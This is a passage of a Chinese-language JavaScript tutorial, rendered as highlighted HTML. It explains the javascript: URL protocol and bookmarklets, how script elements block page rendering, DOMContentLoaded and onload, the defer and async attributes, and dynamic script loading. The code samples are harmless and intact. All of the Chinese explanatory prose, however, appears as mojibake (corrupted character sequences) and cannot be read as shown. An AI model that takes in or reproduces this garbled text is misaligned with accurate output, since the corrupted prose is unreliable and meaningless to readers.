</code></pre></div><p>æµè§ˆå™¨çš„åœ°å€æ ä¹Ÿå¯ä»¥æ‰§è¡Œ<code>javascript:</code>åè®®ã€‚å°†<code>javascript:console.log(&#39;Hello&#39;)</code>æ”¾å…¥åœ°å€æ ï¼ŒæŒ‰å›è½¦é”®ä¹Ÿä¼šæ‰§è¡Œè¿™æ®µä»£ç ã€‚</p><p>å¦‚æœ JavaScript ä»£ç è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæµè§ˆå™¨å°±ä¼šæ–°å»ºä¸€ä¸ªæ–‡æ¡£ï¼Œå±•ç¤ºè¿™ä¸ªå­—ç¬¦ä¸²çš„å†…å®¹ï¼ŒåŸæœ‰æ–‡æ¡£çš„å†…å®¹éƒ½ä¼šæ¶ˆå¤±ã€‚</p><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>javascript: new Date().toLocaleTimeString();<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>ç‚¹å‡»<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œç”¨æˆ·ç‚¹å‡»é“¾æ¥ä»¥åï¼Œä¼šæ‰“å¼€ä¸€ä¸ªæ–°æ–‡æ¡£ï¼Œé‡Œé¢æœ‰å½“å‰æ—¶é—´ã€‚</p><p>å¦‚æœè¿”å›çš„ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¸ä¼šæ–°å»ºæ–‡æ¡£ï¼Œä¹Ÿä¸ä¼šè·³è½¬ã€‚</p><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>javascript: console.log(new Date().toLocaleTimeString())<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>ç‚¹å‡»<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œç”¨æˆ·ç‚¹å‡»é“¾æ¥åï¼Œç½‘é¡µä¸ä¼šè·³è½¬ï¼Œåªä¼šåœ¨æ§åˆ¶å°æ˜¾ç¤ºå½“å‰æ—¶é—´ã€‚</p><p><code>javascript:</code>åè®®çš„å¸¸è§ç”¨é€”æ˜¯ä¹¦ç­¾è„šæœ¬ Bookmarkletã€‚ç”±äºæµè§ˆå™¨çš„ä¹¦ç­¾ä¿å­˜çš„æ˜¯ä¸€ä¸ªç½‘å€ï¼Œæ‰€ä»¥<code>javascript:</code>ç½‘å€ä¹Ÿå¯ä»¥ä¿å­˜åœ¨é‡Œé¢ï¼Œç”¨æˆ·é€‰æ‹©è¿™ä¸ªä¹¦ç­¾çš„æ—¶å€™ï¼Œå°±ä¼šåœ¨å½“å‰é¡µé¢æ‰§è¡Œè¿™ä¸ªè„šæœ¬ã€‚ä¸ºäº†é˜²æ­¢ä¹¦ç­¾æ›¿æ¢æ‰å½“å‰æ–‡æ¡£ï¼Œå¯ä»¥åœ¨è„šæœ¬å‰åŠ ä¸Š<code>void</code>ï¼Œæˆ–è€…åœ¨è„šæœ¬æœ€ååŠ ä¸Š<code>void 0</code>ã€‚</p><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>javascript: void new Date().toLocaleTimeString();<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>ç‚¹å‡»<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>javascript: new Date().toLocaleTimeString();void 0;<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>ç‚¹å‡»<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>ä¸Šé¢è¿™ä¸¤ç§å†™æ³•ï¼Œç‚¹å‡»é“¾æ¥åï¼Œæ‰§è¡Œä»£ç éƒ½ä¸ä¼šç½‘é¡µè·³è½¬ã€‚</p><h3 id="script-å…ƒç´ " tabindex="-1"><a class="header-anchor" href="#script-å…ƒç´ " aria-hidden="true">#</a> script å…ƒç´ </h3><h4 id="å·¥ä½œåŸç†" tabindex="-1"><a class="header-anchor" href="#å·¥ä½œåŸç†" aria-hidden="true">#</a> å·¥ä½œåŸç†</h4><p>æµè§ˆå™¨åŠ è½½ JavaScript è„šæœ¬ï¼Œä¸»è¦é€šè¿‡<code>&lt;script&gt;</code>å…ƒç´ å®Œæˆã€‚æ­£å¸¸çš„ç½‘é¡µåŠ è½½æµç¨‹æ˜¯è¿™æ ·çš„ã€‚</p><ol><li>æµè§ˆå™¨ä¸€è¾¹ä¸‹è½½ HTML ç½‘é¡µï¼Œä¸€è¾¹å¼€å§‹è§£æã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ç­‰åˆ°ä¸‹è½½å®Œï¼Œå°±å¼€å§‹è§£æã€‚</li><li>è§£æè¿‡ç¨‹ä¸­ï¼Œæµè§ˆå™¨å‘ç°<code>&lt;script&gt;</code>å…ƒç´ ï¼Œå°±æš‚åœè§£æï¼ŒæŠŠç½‘é¡µæ¸²æŸ“çš„æ§åˆ¶æƒè½¬äº¤ç»™ JavaScript å¼•æ“ã€‚</li><li>å¦‚æœ<code>&lt;script&gt;</code>å…ƒç´ å¼•ç”¨äº†å¤–éƒ¨è„šæœ¬ï¼Œå°±ä¸‹è½½è¯¥è„šæœ¬å†æ‰§è¡Œï¼Œå¦åˆ™å°±ç›´æ¥æ‰§è¡Œä»£ç ã€‚</li><li>JavaScript å¼•æ“æ‰§è¡Œå®Œæ¯•ï¼Œæ§åˆ¶æƒäº¤è¿˜æ¸²æŸ“å¼•æ“ï¼Œæ¢å¤å¾€ä¸‹è§£æ HTML ç½‘é¡µã€‚</li></ol><p>åŠ è½½å¤–éƒ¨è„šæœ¬æ—¶ï¼Œæµè§ˆå™¨ä¼šæš‚åœé¡µé¢æ¸²æŸ“ï¼Œç­‰å¾…è„šæœ¬ä¸‹è½½å¹¶æ‰§è¡Œå®Œæˆåï¼Œå†ç»§ç»­æ¸²æŸ“ã€‚åŸå› æ˜¯ JavaScript ä»£ç å¯ä»¥ä¿®æ”¹ DOMï¼Œæ‰€ä»¥å¿…é¡»æŠŠæ§åˆ¶æƒè®©ç»™å®ƒï¼Œå¦åˆ™ä¼šå¯¼è‡´å¤æ‚çš„çº¿ç¨‹ç«èµ›çš„é—®é¢˜ã€‚</p><p>å¦‚æœå¤–éƒ¨è„šæœ¬åŠ è½½æ—¶é—´å¾ˆé•¿ï¼ˆä¸€ç›´æ— æ³•å®Œæˆä¸‹è½½ï¼‰ï¼Œé‚£ä¹ˆæµè§ˆå™¨å°±ä¼šä¸€ç›´ç­‰å¾…è„šæœ¬ä¸‹è½½å®Œæˆï¼Œé€ æˆç½‘é¡µé•¿æ—¶é—´å¤±å»å“åº”ï¼Œæµè§ˆå™¨å°±ä¼šå‘ˆç°â€œå‡æ­»â€çŠ¶æ€ï¼Œè¿™è¢«ç§°ä¸ºâ€œé˜»å¡æ•ˆåº”â€ã€‚</p><p>ä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼Œè¾ƒå¥½çš„åšæ³•æ˜¯å°†<code>&lt;script&gt;</code>æ ‡ç­¾éƒ½æ”¾åœ¨é¡µé¢åº•éƒ¨ï¼Œè€Œä¸æ˜¯å¤´éƒ¨ã€‚è¿™æ ·å³ä½¿é‡åˆ°è„šæœ¬å¤±å»å“åº”ï¼Œç½‘é¡µä¸»ä½“çš„æ¸²æŸ“ä¹Ÿå·²ç»å®Œæˆäº†ï¼Œç”¨æˆ·è‡³å°‘å¯ä»¥çœ‹åˆ°å†…å®¹ï¼Œè€Œä¸æ˜¯é¢å¯¹ä¸€å¼ ç©ºç™½çš„é¡µé¢ã€‚å¦‚æœæŸäº›è„šæœ¬ä»£ç éå¸¸é‡è¦ï¼Œä¸€å®šè¦æ”¾åœ¨é¡µé¢å¤´éƒ¨çš„è¯ï¼Œæœ€å¥½ç›´æ¥å°†ä»£ç å†™å…¥é¡µé¢ï¼Œè€Œä¸æ˜¯è¿æ¥å¤–éƒ¨è„šæœ¬æ–‡ä»¶ï¼Œè¿™æ ·èƒ½ç¼©çŸ­åŠ è½½æ—¶é—´ã€‚</p><p>è„šæœ¬æ–‡ä»¶éƒ½æ”¾åœ¨ç½‘é¡µå°¾éƒ¨åŠ è½½ï¼Œè¿˜æœ‰ä¸€ä¸ªå¥½å¤„ã€‚å› ä¸ºåœ¨ DOM ç»“æ„ç”Ÿæˆä¹‹å‰å°±è°ƒç”¨ DOM èŠ‚ç‚¹ï¼ŒJavaScript ä¼šæŠ¥é”™ï¼Œå¦‚æœè„šæœ¬éƒ½åœ¨ç½‘é¡µå°¾éƒ¨åŠ è½½ï¼Œå°±ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼Œå› ä¸ºè¿™æ—¶ DOM è‚¯å®šå·²ç»ç”Ÿæˆäº†ã€‚</p><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span><span class="token punctuation">;</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>ä¸Šé¢ä»£ç æ‰§è¡Œæ—¶ä¼šæŠ¥é”™ï¼Œå› ä¸ºæ­¤æ—¶<code>document.body</code>å…ƒç´ è¿˜æœªç”Ÿæˆã€‚</p><p>ä¸€ç§è§£å†³æ–¹æ³•æ˜¯è®¾å®š<code>DOMContentLoaded</code>äº‹ä»¶çš„å›è°ƒå‡½æ•°ã€‚</p><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>
      <span class="token string">&#39;DOMContentLoaded&#39;</span><span class="token punctuation">,</span>
      <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼ŒæŒ‡å®š<code>DOMContentLoaded</code>äº‹ä»¶å‘ç”Ÿåï¼Œæ‰å¼€å§‹æ‰§è¡Œç›¸å…³ä»£ç ã€‚<code>DOMContentLoaded</code>äº‹ä»¶åªæœ‰åœ¨ DOM ç»“æ„ç”Ÿæˆä¹‹åæ‰ä¼šè§¦å‘ã€‚</p><p>å¦ä¸€ç§è§£å†³æ–¹æ³•æ˜¯ï¼Œä½¿ç”¨<code>&lt;script&gt;</code>æ ‡ç­¾çš„<code>onload</code>å±æ€§ã€‚å½“<code>&lt;script&gt;</code>æ ‡ç­¾æŒ‡å®šçš„å¤–éƒ¨è„šæœ¬æ–‡ä»¶ä¸‹è½½å’Œè§£æå®Œæˆï¼Œä¼šè§¦å‘ä¸€ä¸ª<code>load</code>äº‹ä»¶ï¼Œå¯ä»¥æŠŠæ‰€éœ€æ‰§è¡Œçš„ä»£ç ï¼Œæ”¾åœ¨è¿™ä¸ªäº‹ä»¶çš„å›è°ƒå‡½æ•°é‡Œé¢ã€‚</p><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>jquery.min.js<span class="token punctuation">&quot;</span></span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token value javascript language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span></span><span class="token punctuation">&quot;</span></span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>ä½†æ˜¯ï¼Œå¦‚æœå°†è„šæœ¬æ”¾åœ¨é¡µé¢åº•éƒ¨ï¼Œå°±å¯ä»¥å®Œå…¨æŒ‰ç…§æ­£å¸¸çš„æ–¹å¼å†™ï¼Œä¸Šé¢ä¸¤ç§æ–¹å¼éƒ½ä¸éœ€è¦ã€‚</p><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
  <span class="token comment">&lt;!-- å…¶ä»–ä»£ç   --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span><span class="token punctuation">;</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>å¦‚æœæœ‰å¤šä¸ª<code>script</code>æ ‡ç­¾ï¼Œæ¯”å¦‚ä¸‹é¢è¿™æ ·ã€‚</p><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>a.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>b.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>æµè§ˆå™¨ä¼šåŒæ—¶å¹¶è¡Œä¸‹è½½<code>a.js</code>å’Œ<code>b.js</code>ï¼Œä½†æ˜¯ï¼Œæ‰§è¡Œæ—¶ä¼šä¿è¯å…ˆæ‰§è¡Œ<code>a.js</code>ï¼Œç„¶åå†æ‰§è¡Œ<code>b.js</code>ï¼Œå³ä½¿åè€…å…ˆä¸‹è½½å®Œæˆï¼Œä¹Ÿæ˜¯å¦‚æ­¤ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè„šæœ¬çš„æ‰§è¡Œé¡ºåºç”±å®ƒä»¬åœ¨é¡µé¢ä¸­çš„å‡ºç°é¡ºåºå†³å®šï¼Œè¿™æ˜¯ä¸ºäº†ä¿è¯è„šæœ¬ä¹‹é—´çš„ä¾èµ–å…³ç³»ä¸å—åˆ°ç ´åã€‚å½“ç„¶ï¼ŒåŠ è½½è¿™ä¸¤ä¸ªè„šæœ¬éƒ½ä¼šäº§ç”Ÿâ€œé˜»å¡æ•ˆåº”â€ï¼Œå¿…é¡»ç­‰åˆ°å®ƒä»¬éƒ½åŠ è½½å®Œæˆï¼Œæµè§ˆå™¨æ‰ä¼šç»§ç»­é¡µé¢æ¸²æŸ“ã€‚</p><p>è§£æå’Œæ‰§è¡Œ CSSï¼Œä¹Ÿä¼šäº§ç”Ÿé˜»å¡ã€‚Firefox æµè§ˆå™¨ä¼šç­‰åˆ°è„šæœ¬å‰é¢çš„æ‰€æœ‰æ ·å¼è¡¨ï¼Œéƒ½ä¸‹è½½å¹¶è§£æå®Œï¼Œå†æ‰§è¡Œè„šæœ¬ï¼›Webkitåˆ™æ˜¯ä¸€æ—¦å‘ç°è„šæœ¬å¼•ç”¨äº†æ ·å¼ï¼Œå°±ä¼šæš‚åœæ‰§è¡Œè„šæœ¬ï¼Œç­‰åˆ°æ ·å¼è¡¨ä¸‹è½½å¹¶è§£æå®Œï¼Œå†æ¢å¤æ‰§è¡Œã€‚</p><p>æ­¤å¤–ï¼Œå¯¹äºæ¥è‡ªåŒä¸€ä¸ªåŸŸåçš„èµ„æºï¼Œæ¯”å¦‚è„šæœ¬æ–‡ä»¶ã€æ ·å¼è¡¨æ–‡ä»¶ã€å›¾ç‰‡æ–‡ä»¶ç­‰ï¼Œæµè§ˆå™¨ä¸€èˆ¬æœ‰é™åˆ¶ï¼ŒåŒæ—¶æœ€å¤šä¸‹è½½6ï½20ä¸ªèµ„æºï¼Œå³æœ€å¤šåŒæ—¶æ‰“å¼€çš„ TCP è¿æ¥æœ‰é™åˆ¶ï¼Œè¿™æ˜¯ä¸ºäº†é˜²æ­¢å¯¹æœåŠ¡å™¨é€ æˆå¤ªå¤§å‹åŠ›ã€‚å¦‚æœæ˜¯æ¥è‡ªä¸åŒåŸŸåçš„èµ„æºï¼Œå°±æ²¡æœ‰è¿™ä¸ªé™åˆ¶ã€‚æ‰€ä»¥ï¼Œé€šå¸¸æŠŠé™æ€æ–‡ä»¶æ”¾åœ¨ä¸åŒçš„åŸŸåä¹‹ä¸‹ï¼Œä»¥åŠ å¿«ä¸‹è½½é€Ÿåº¦ã€‚</p><h4 id="defer-å±æ€§" tabindex="-1"><a class="header-anchor" href="#defer-å±æ€§" aria-hidden="true">#</a> defer å±æ€§</h4><p>ä¸ºäº†è§£å†³è„šæœ¬æ–‡ä»¶ä¸‹è½½é˜»å¡ç½‘é¡µæ¸²æŸ“çš„é—®é¢˜ï¼Œä¸€ä¸ªæ–¹æ³•æ˜¯å¯¹<code>&lt;script&gt;</code>å…ƒç´ åŠ å…¥<code>defer</code>å±æ€§ã€‚å®ƒçš„ä½œç”¨æ˜¯å»¶è¿Ÿè„šæœ¬çš„æ‰§è¡Œï¼Œç­‰åˆ° DOM åŠ è½½ç”Ÿæˆåï¼Œå†æ‰§è¡Œè„šæœ¬ã€‚</p><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>a.js<span class="token punctuation">&quot;</span></span> <span class="token attr-name">defer</span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>b.js<span class="token punctuation">&quot;</span></span> <span class="token attr-name">defer</span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œåªæœ‰ç­‰åˆ° DOM åŠ è½½å®Œæˆåï¼Œæ‰ä¼šæ‰§è¡Œ<code>a.js</code>å’Œ<code>b.js</code>ã€‚</p><p><code>defer</code>å±æ€§çš„è¿è¡Œæµç¨‹å¦‚ä¸‹ã€‚</p><ol><li>æµè§ˆå™¨å¼€å§‹è§£æ HTML ç½‘é¡µã€‚</li><li>è§£æè¿‡ç¨‹ä¸­ï¼Œå‘ç°å¸¦æœ‰<code>defer</code>å±æ€§çš„<code>&lt;script&gt;</code>å…ƒç´ ã€‚</li><li>æµè§ˆå™¨ç»§ç»­å¾€ä¸‹è§£æ HTML ç½‘é¡µï¼ŒåŒæ—¶å¹¶è¡Œä¸‹è½½<code>&lt;script&gt;</code>å…ƒç´ åŠ è½½çš„å¤–éƒ¨è„šæœ¬ã€‚</li><li>æµè§ˆå™¨å®Œæˆè§£æ HTML ç½‘é¡µï¼Œæ­¤æ—¶å†å›è¿‡å¤´æ‰§è¡Œå·²ç»ä¸‹è½½å®Œæˆçš„è„šæœ¬ã€‚</li></ol><p>æœ‰äº†<code>defer</code>å±æ€§ï¼Œæµè§ˆå™¨ä¸‹è½½è„šæœ¬æ–‡ä»¶çš„æ—¶å€™ï¼Œä¸ä¼šé˜»å¡é¡µé¢æ¸²æŸ“ã€‚ä¸‹è½½çš„è„šæœ¬æ–‡ä»¶åœ¨<code>DOMContentLoaded</code>äº‹ä»¶è§¦å‘å‰æ‰§è¡Œï¼ˆå³åˆšåˆšè¯»å–å®Œ<code>&lt;/html&gt;</code>æ ‡ç­¾ï¼‰ï¼Œè€Œä¸”å¯ä»¥ä¿è¯æ‰§è¡Œé¡ºåºå°±æ˜¯å®ƒä»¬åœ¨é¡µé¢ä¸Šå‡ºç°çš„é¡ºåºã€‚</p><p>å¯¹äºå†…ç½®è€Œä¸æ˜¯åŠ è½½å¤–éƒ¨è„šæœ¬çš„<code>script</code>æ ‡ç­¾ï¼Œä»¥åŠåŠ¨æ€ç”Ÿæˆçš„<code>script</code>æ ‡ç­¾ï¼Œ<code>defer</code>å±æ€§ä¸èµ·ä½œç”¨ã€‚å¦å¤–ï¼Œä½¿ç”¨<code>defer</code>åŠ è½½çš„å¤–éƒ¨è„šæœ¬ä¸åº”è¯¥ä½¿ç”¨<code>document.write</code>æ–¹æ³•ã€‚</p><h4 id="async-å±æ€§" tabindex="-1"><a class="header-anchor" href="#async-å±æ€§" aria-hidden="true">#</a> async å±æ€§</h4><p>è§£å†³â€œé˜»å¡æ•ˆåº”â€çš„å¦ä¸€ä¸ªæ–¹æ³•æ˜¯å¯¹<code>&lt;script&gt;</code>å…ƒç´ åŠ å…¥<code>async</code>å±æ€§ã€‚</p><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>a.js<span class="token punctuation">&quot;</span></span> <span class="token attr-name">async</span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>b.js<span class="token punctuation">&quot;</span></span> <span class="token attr-name">async</span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><code>async</code>å±æ€§çš„ä½œç”¨æ˜¯ï¼Œä½¿ç”¨å¦ä¸€ä¸ªè¿›ç¨‹ä¸‹è½½è„šæœ¬ï¼Œä¸‹è½½æ—¶ä¸ä¼šé˜»å¡æ¸²æŸ“ã€‚</p><ol><li>æµè§ˆå™¨å¼€å§‹è§£æ HTML ç½‘é¡µã€‚</li><li>è§£æè¿‡ç¨‹ä¸­ï¼Œå‘ç°å¸¦æœ‰<code>async</code>å±æ€§çš„<code>script</code>æ ‡ç­¾ã€‚</li><li>æµè§ˆå™¨ç»§ç»­å¾€ä¸‹è§£æ HTML ç½‘é¡µï¼ŒåŒæ—¶å¹¶è¡Œä¸‹è½½<code>&lt;script&gt;</code>æ ‡ç­¾ä¸­çš„å¤–éƒ¨è„šæœ¬ã€‚</li><li>è„šæœ¬ä¸‹è½½å®Œæˆï¼Œæµè§ˆå™¨æš‚åœè§£æ HTML ç½‘é¡µï¼Œå¼€å§‹æ‰§è¡Œä¸‹è½½çš„è„šæœ¬ã€‚</li><li>è„šæœ¬æ‰§è¡Œå®Œæ¯•ï¼Œæµè§ˆå™¨æ¢å¤è§£æ HTML ç½‘é¡µã€‚</li></ol><p><code>async</code>å±æ€§å¯ä»¥ä¿è¯è„šæœ¬ä¸‹è½½çš„åŒæ—¶ï¼Œæµè§ˆå™¨ç»§ç»­æ¸²æŸ“ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸€æ—¦é‡‡ç”¨è¿™ä¸ªå±æ€§ï¼Œå°±æ— æ³•ä¿è¯è„šæœ¬çš„æ‰§è¡Œé¡ºåºã€‚å“ªä¸ªè„šæœ¬å…ˆä¸‹è½½ç»“æŸï¼Œå°±å…ˆæ‰§è¡Œé‚£ä¸ªè„šæœ¬ã€‚å¦å¤–ï¼Œä½¿ç”¨<code>async</code>å±æ€§çš„è„šæœ¬æ–‡ä»¶é‡Œé¢çš„ä»£ç ï¼Œä¸åº”è¯¥ä½¿ç”¨<code>document.write</code>æ–¹æ³•ã€‚</p><p><code>defer</code>å±æ€§å’Œ<code>async</code>å±æ€§åˆ°åº•åº”è¯¥ä½¿ç”¨å“ªä¸€ä¸ªï¼Ÿ</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœè„šæœ¬ä¹‹é—´æ²¡æœ‰ä¾èµ–å…³ç³»ï¼Œå°±ä½¿ç”¨<code>async</code>å±æ€§ï¼Œå¦‚æœè„šæœ¬ä¹‹é—´æœ‰ä¾èµ–å…³ç³»ï¼Œå°±ä½¿ç”¨<code>defer</code>å±æ€§ã€‚å¦‚æœåŒæ—¶ä½¿ç”¨<code>async</code>å’Œ<code>defer</code>å±æ€§ï¼Œåè€…ä¸èµ·ä½œç”¨ï¼Œæµè§ˆå™¨è¡Œä¸ºç”±<code>async</code>å±æ€§å†³å®šã€‚</p><h4 id="è„šæœ¬çš„åŠ¨æ€åŠ è½½" tabindex="-1"><a class="header-anchor" href="#è„šæœ¬çš„åŠ¨æ€åŠ è½½" aria-hidden="true">#</a> è„šæœ¬çš„åŠ¨æ€åŠ è½½</h4><p><code>&lt;script&gt;</code>å…ƒç´ è¿˜å¯ä»¥åŠ¨æ€ç”Ÿæˆï¼Œç”Ÿæˆåå†æ’å…¥é¡µé¢ï¼Œä»è€Œå®ç°è„šæœ¬çš„åŠ¨æ€åŠ è½½ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token punctuation">[</span><span class="token string">&#39;a.js&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;b.js&#39;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">src</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">&#39;script&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  script<span class="token punctuation">.</span>src <span class="token operator">=</span> src<span class="token punctuation">;</span>
  document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
